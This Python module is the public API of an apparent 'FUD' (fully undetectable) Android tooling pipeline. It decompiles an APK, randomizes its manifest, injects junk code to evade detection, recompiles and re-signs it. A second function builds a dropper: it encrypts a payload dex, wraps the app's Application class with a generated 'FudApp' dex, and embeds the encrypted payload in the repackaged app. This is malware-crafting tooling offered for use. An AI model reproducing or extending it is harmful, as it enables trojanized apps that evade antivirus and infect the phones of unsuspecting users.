"""FUD pipeline — public API."""
import os
import time

from setup import ensure_tools
from apktool_wrapper import decompile, recompile
from manifest import randomize_manifest
from junk_injector import inject_junk
from signer import sign_apk
from payload_injector import (
    _patch_manifest, _read_app_class,
    _build_fud_app_dex, _add_to_apk,
)
from tools_encrypt import encrypt_bytes


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} ===== t={time.time():.0f}", flush=True)


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/5 apktool decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "2/5 manifest randomize")
    randomize_manifest(decompiled)

    _step(session_dir, "3/5 junk inject")
    inject_junk(decompiled)

    _step(session_dir, "4/5 apktool recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "5/5 sign")
    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] PIPELINE DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline_dropper(input_apk: str, payload_dex: str,
                              output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/7 encrypt payload")
    with open(payload_dex, "rb") as f:
        raw = f.read()
    pbin = os.path.join(session_dir, "p.bin")
    with open(pbin, "wb") as f:
        f.write(encrypt_bytes(raw))
    print(f"[✓] payload encrypted {len(raw)} → {os.path.getsize(pbin)} bytes", flush=True)

    _step(session_dir, "2/7 apktool decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "3/7 manifest randomize")
    randomize_manifest(decompiled)

    _step(session_dir, "4/7 junk inject")
    inject_junk(decompiled)

    _step(session_dir, "5/7 build FudApp dex")
    original_class = _read_app_class(decompiled)
    print(f"[*] original Application class: {original_class}", flush=True)
    fud_dex = os.path.join(session_dir, "fudapp.dex")
    _build_fud_app_dex(original_class, fud_dex)
    _patch_manifest(decompiled)

    _step(session_dir, "6/7 apktool recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "7/7 add payload + sign")
    _add_to_apk(unsigned, pbin, fud_dex)
    sign_apk(unsigned, output_apk)
    _step(session_dir, "done")
    print(f"[✓] DROPPER DONE → {output_apk}", flush=True)
    return output_apk
